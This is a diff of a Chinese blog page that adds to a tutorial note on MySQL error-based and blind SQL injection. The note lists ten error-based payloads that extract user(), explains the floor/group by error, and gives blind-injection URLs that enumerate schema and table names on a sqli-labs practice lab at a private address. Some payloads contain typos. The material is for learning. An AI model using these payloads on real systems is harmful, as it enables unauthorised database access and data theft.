@@ -13,7 +13,7 @@
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: SQL 盲注\n\n\n\n\n\n\nURL 注释\n-- | 空格后面可以跟上任何字符\n--+ URL 中会把 + 解析为空格\n# 识别为锚点\n\nGET 参数会被 url 编码，但 POST 参数不会被 url 编码，请求头也不会编码。\n整型 id=26-1可以用，但 id=3+9 却不能用，因为 + 解析为空格。\n\n\n\n符号\nurl 编码\n\n\n\n空格\n%20\n\n\n‘\n%27\n\n\n#\n%23\n\n\n“\n%22\n\n\n%\n%25\n\n\n&amp;\n%26\n\n\n/\n%2F\n\n\n十种 MySQL 报错注入\nfloor()\n\n1select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\nfloor() 报错注入准确地说应该是 floor，count，group by 冲突报错。特定情况下，三个函数在一起使用会产生错误。\n经典的 floor 注入语句：\n1and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n首先看 floor() 报错产生条件：\n1select count(*), concat(database(), floor(rand(0)*2))x from security.users group by x\n\n语句中 x 是给 floor(rand(0)*2)添加一个别名，执行该语句得到： \n1!#1062 - Duplicate entry &apos;security1&apos; for key &apos;&lt;group_key&gt;&apos;\n\nfloor() 报错原理分析：\n1select count(), floor(rand(0)*2) as x from information_schema_tables groupby a;\n\n重点在 group by a ，即 group by floor(rand(0)*2)。首先，floor(rand(0)*2) 意思是随机产生 0 或 1。虽说是随机的，但有规律可循，基本上是 011011这个序列。\n为什么报错？\n首先，系统会建立一个虚拟表：\n\n\n\nkey\ncount(*)\n\n\n\n\n\n\n\n\n\n\n\n假设有表：\n\n\n\nid\nname\nage\n\n\n\n1\n11\n18\n\n\n2\n22\n19\n\n\n3\n33\n20\n\n\n4\n44\n20\n\n\n5\n55\n18\n\n\n执行 count(*) from ... group by age 的过程中，会形成这样的虚拟表：\n\n\n\nkey\ncount(*)\n\n\n\n18\n2\n\n\n19\n1\n\n\n20\n2\n\n\n那么这个表是如何形成的？由于 group by 的是 age，第一次读取的是 18 ，在虚拟表中寻找是否已经存在 18 ，由于表是空的，直接插入一条新数据，这时虚拟表变成这样：\n\n\n\nkey\ncount(*)\n\n\n\n18\n1\n\n\n\n\n\n\n\n\n\n\n下一个时 19 ，由于虚拟表中依旧没有 key 为 19 的字段，故插入。再插入 20 ，和 19 的情况一样，当继续插入 第二个 20 时，由于已经有了 20 ，故将 key 为 20 的字段的 count(*) 的值加 1，依次类推，形成最后的虚拟表：\n\n\n\nkey\ncount(*)\n\n\n\n18\n2\n\n\n19\n1\n\n\n20\n2\n\n\n如何将 group by 与 floor 联合起来，进行 floor 报错？\n1select count(), floor(rand(0)*2) as a from information_schema.tables group by a;\n\ngroup by 的是 floor(rand(0)*2) 每次运算的值都是随机的，首先，建立一张虚拟表，\n\n\n\nkey\ncount(*)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n接着，进行 group by floor(rand(0)*2) 。floor 表达式第一次运算的值为 0 ，在表中没有找到 key 为 0 的数据，故插入，在插入过程中需要再取一次  group by 后面的值，即在执行一次 floor 运算，结果为 1，取到了 1 ，插入数据，并将 count() 置 1.\n\n\n\nkey\ncount(*)\n\n\n\n1\n1\n\n\n\n\n\n\n再进行 group by floor(rand(0)2)，表为\n\n\n\nkey\ncount(*)\n\n\n\n1\n2\n\n\n\n\n\n\n执行到第四次 floor 运算时，这次值为 0 ，表中没有找到 key 为 0 的数据，故应当插入一条新数据，插入时，进行 floor 运算，这时值为 1，将 count(*) 置 1 。但虚拟表中已经有了 key 为 1数据，故此时会抛出主键冗余的异常，这就是所谓的 floor 报错。\n","dateCreated":"2019-08-28T19:37:48+08:00","dateModified":"2019-08-29T00:20:00+08:00","datePublished":"2019-08-28T19:37:48+08:00","description":"Abstract: SQL 盲注","headline":"note33","image":["https://images.pexels.com/photos/746393/pexels-photo-746393.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/28/note33/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/28/note33/","keywords":"SQL 盲注","thumbnailUrl":"https://images.pexels.com/photos/746393/pexels-photo-746393.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: SQL 盲注\n\n\n\n\n\n\nURL 注释\n-- | 空格后面可以跟上任何字符\n--+ URL 中会把 + 解析为空格\n# 识别为锚点\n\nGET 参数会被 url 编码，但 POST 参数不会被 url 编码，请求头也不会编码。\n整型 id=26-1可以用，但 id=3+9 却不能用，因为 + 解析为空格。\n\n\n\n符号\nurl 编码\n\n\n\n空格\n%20\n\n\n‘\n%27\n\n\n#\n%23\n\n\n“\n%22\n\n\n%\n%25\n\n\n&amp;\n%26\n\n\n/\n%2F\n\n\n十种 MySQL 报错注入\nfloor()\n\n1select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\nfloor() 报错注入准确地说应该是 floor，count，group by 冲突报错。特定情况下，三个函数在一起使用会产生错误。\n经典的 floor 注入语句：\n1and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n首先看 floor() 报错产生条件：\n1select count(*), concat(database(), floor(rand(0)*2))x from security.users group by x\n\n语句中 x 是给 floor(rand(0)*2)添加一个别名，执行该语句得到： \n1!#1062 - Duplicate entry &apos;security1&apos; for key &apos;&lt;group_key&gt;&apos;\n\nfloor() 报错原理分析：\n1select count(), floor(rand(0)*2) as x from information_schema_tables groupby a;\n\n重点在 group by a ，即 group by floor(rand(0)*2)。首先，floor(rand(0)*2) 意思是随机产生 0 或 1。虽说是随机的，但有规律可循，基本上是 011011这个序列。\n为什么报错？\n首先，系统会建立一个虚拟表：\n\n\n\nkey\ncount(*)\n\n\n\n\n\n\n\n\n\n\n\n假设有表：\n\n\n\nid\nname\nage\n\n\n\n1\n11\n18\n\n\n2\n22\n19\n\n\n3\n33\n20\n\n\n4\n44\n20\n\n\n5\n55\n18\n\n\n执行 count(*) from ... group by age 的过程中，会形成这样的虚拟表：\n\n\n\nkey\ncount(*)\n\n\n\n18\n2\n\n\n19\n1\n\n\n20\n2\n\n\n那么这个表是如何形成的？由于 group by 的是 age，第一次读取的是 18 ，在虚拟表中寻找是否已经存在 18 ，由于表是空的，直接插入一条新数据，这时虚拟表变成这样：\n\n\n\nkey\ncount(*)\n\n\n\n18\n1\n\n\n\n\n\n\n\n\n\n\n下一个时 19 ，由于虚拟表中依旧没有 key 为 19 的字段，故插入。再插入 20 ，和 19 的情况一样，当继续插入 第二个 20 时，由于已经有了 20 ，故将 key 为 20 的字段的 count(*) 的值加 1，依次类推，形成最后的虚拟表：\n\n\n\nkey\ncount(*)\n\n\n\n18\n2\n\n\n19\n1\n\n\n20\n2\n\n\n如何将 group by 与 floor 联合起来，进行 floor 报错？\n1select count(), floor(rand(0)*2) as a from information_schema.tables group by a;\n\ngroup by 的是 floor(rand(0)*2) 每次运算的值都是随机的，首先，建立一张虚拟表，\n\n\n\nkey\ncount(*)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n接着，进行 group by floor(rand(0)*2) 。floor 表达式第一次运算的值为 0 ，在表中没有找到 key 为 0 的数据，故插入，在插入过程中需要再取一次  group by 后面的值，即在执行一次 floor 运算，结果为 1，取到了 1 ，插入数据，并将 count() 置 1.\n\n\n\nkey\ncount(*)\n\n\n\n1\n1\n\n\n\n\n\n\n再进行 group by floor(rand(0)2)，表为\n\n\n\nkey\ncount(*)\n\n\n\n1\n2\n\n\n\n\n\n\n执行到第四次 floor 运算时，这次值为 0 ，表中没有找到 key 为 0 的数据，故应当插入一条新数据，插入时，进行 floor 运算，这时值为 1，将 count(*) 置 1 。但虚拟表中已经有了 key 为 1数据，故此时会抛出主键冗余的异常，这就是所谓的 floor 报错。\n1select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n\nextractvalue()\n\n1select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n\nupdatexml()\n\n1select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n\n\ngeometrycollection()\n\n1select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n\n\nmultipoint()\n\n1select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));\n\n\npolygon()\n\n1select * from test where id=1 and polygon((select * from(select * from(select user())a)b));\n\n\nmultipolygon()\n\n1select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));\n\n\nlinestring()\n\n1select * from test where id=1 and linestring((select * from(select * from(select user())a)b));\n\n\nexp()\n\n1select * from test where id=1 and exp(~(select * from(select user())a));\n\n\nmultilinestring()\n\n1select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));\n\n其中，对于 mariadb ，方法 1-3 适用，mysql 8.0  方法 2-3 可用，mysql 5.0 方法 1-9 适用。\nSQL 盲注盲注流程：\n\n先判断总数\n判断单个长度\n逐个字符判断名称，二分法\n\n常用函数\n\n\n\n函数\n功能\n\n\n\nascii(‘A’)\n查看 ASCII 码\n\n\nchar(100)\n通过 ASCII 码，查看字符\n\n\nsubstr/mid(str, start,length)\n截取字符\n\n\nlength(string)\n计算字符串长度\n\n\ncount( )\n统计个数\n\n\n常用命令\n12# 库名http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and select group_concat(schema_name) from information_schema.schemata --+\n\n12# 库名长度http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select group_concat(schema_name) from information_schema.schemata)) &gt; 50 --+\n\n12# 判断各个字符 ASCIIhttp://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select group_concat(schema_name) from information_schema.schemata), 1, 1)) &gt; 50 --+\n\n1http://192.168.100.52/sqli-labs/Less-8/?id=1&apos;and (select count(distinct schema_name) from information_schema.schemata) &gt; 3 ——+\n\n1http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and mid((select distinct schema_name from information_schema.schemata limit 0,1), 1, 1) &gt; 50 --+\n\n12# 查看当前数据中有几张表http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and (select count(table_name) from information_schema.tables where table_schema = database()) &gt; 1 --+\n\n12# 查看一张表的名字http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) &gt; 1 --+\n\n1http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select table_name from information_schema.tables where table_schema = database() limit 0,1), 1, 1)) &gt; 100 --+\n\n","dateCreated":"2019-08-28T19:37:48+08:00","dateModified":"2019-08-29T09:05:38+08:00","datePublished":"2019-08-28T19:37:48+08:00","description":"Abstract: SQL 盲注","headline":"note33","image":["https://images.pexels.com/photos/746393/pexels-photo-746393.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/28/note33/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/28/note33/","keywords":"SQL 盲注","thumbnailUrl":"https://images.pexels.com/photos/746393/pexels-photo-746393.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940"}</script>
     <meta name="description" content="Abstract: SQL 盲注">
 <meta name="keywords" content="SQL 盲注">
 <meta property="og:type" content="blog">
@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: SQL 盲注">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-28T16:20:00.749Z">
+<meta property="og:updated_time" content="2019-08-29T01:05:38.588Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="note33">
 <meta name="twitter:description" content="Abstract: SQL 盲注">
@@ -291,7 +291,7 @@
 
 <!--export-->
 
-<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-注释"><span class="toc-text">URL 注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#十种-MySQL-报错注入"><span class="toc-text">十种 MySQL 报错注入</span></a></li></ol>
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-注释"><span class="toc-text">URL 注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#十种-MySQL-报错注入"><span class="toc-text">十种 MySQL 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-盲注"><span class="toc-text">SQL 盲注</span></a></li></ol>
 
 <h3 id="URL-注释"><a href="#URL-注释" class="headerlink" title="URL 注释"></a><code>URL</code> 注释</h3><ol>
 <li><code>-- |</code> 空格后面可以跟上任何字符</li>
@@ -336,9 +336,9 @@
 <td align="center">%2F</td>
 </tr>
 </tbody></table>
-<h3 id="十种-MySQL-报错注入"><a href="#十种-MySQL-报错注入" class="headerlink" title="十种 MySQL 报错注入"></a>十种 <code>MySQL</code> 报错注入</h3><ul>
+<h3 id="十种-MySQL-报错注入"><a href="#十种-MySQL-报错注入" class="headerlink" title="十种 MySQL 报错注入"></a>十种 <code>MySQL</code> 报错注入</h3><ol>
 <li><code>floor()</code></li>
-</ul>
+</ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
 
 <p><code>floor()</code> 报错注入准确地说应该是 <code>floor</code>，<code>count</code>，<code>group by</code> 冲突报错。特定情况下，三个函数在一起使用会产生错误。</p>
@@ -530,6 +530,106 @@
 </tr>
 </tbody></table>
 <p>执行到第四次 floor 运算时，这次值为 0 ，表中没有找到 key 为 0 的数据，故应当插入一条新数据，插入时，进行 floor 运算，这时值为 1，将 count(*) 置 1 。但虚拟表中已经有了 key 为 1数据，故此时会抛出主键冗余的异常，这就是所谓的 floor 报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><code>extractvalue()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><code>updatexml()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><code>geometrycollection()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><code>multipoint()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><code>polygon()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><code>multipolygon()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li><code>linestring()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<ol start="9">
+<li><code>exp()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<ol start="10">
+<li><code>multilinestring()</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>其中，对于 <code>mariadb</code> ，方法 <code>1-3</code> 适用，<code>mysql 8.0</code>  方法 <code>2-3</code> 可用，<code>mysql 5.0</code> 方法 <code>1-9</code> 适用。</p>
+<h3 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h3><p>盲注流程：</p>
+<ol>
+<li>先判断总数</li>
+<li>判断单个长度</li>
+<li>逐个字符判断名称，二分法</li>
+</ol>
+<p>常用函数</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">ascii(‘A’)</td>
+<td align="center">查看 ASCII 码</td>
+</tr>
+<tr>
+<td align="center">char(100)</td>
+<td align="center">通过 ASCII 码，查看字符</td>
+</tr>
+<tr>
+<td align="center">substr/mid(str, start,length)</td>
+<td align="center">截取字符</td>
+</tr>
+<tr>
+<td align="center">length(string)</td>
+<td align="center">计算字符串长度</td>
+</tr>
+<tr>
+<td align="center">count( )</td>
+<td align="center">统计个数</td>
+</tr>
+</tbody></table>
+<p>常用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and select group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名长度</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select group_concat(schema_name) from information_schema.schemata)) &gt; 50 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 判断各个字符 ASCII</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select group_concat(schema_name) from information_schema.schemata), 1, 1)) &gt; 50 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos;and (select count(distinct schema_name) from information_schema.schemata) &gt; 3 ——+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and mid((select distinct schema_name from information_schema.schemata limit 0,1), 1, 1) &gt; 50 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前数据中有几张表</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and (select count(table_name) from information_schema.tables where table_schema = database()) &gt; 1 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看一张表的名字</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select table_name from information_schema.tables where table_schema = database() limit 0,1), 1, 1)) &gt; 100 --+</span><br></pre></td></tr></table></figure>
+
 
             
 
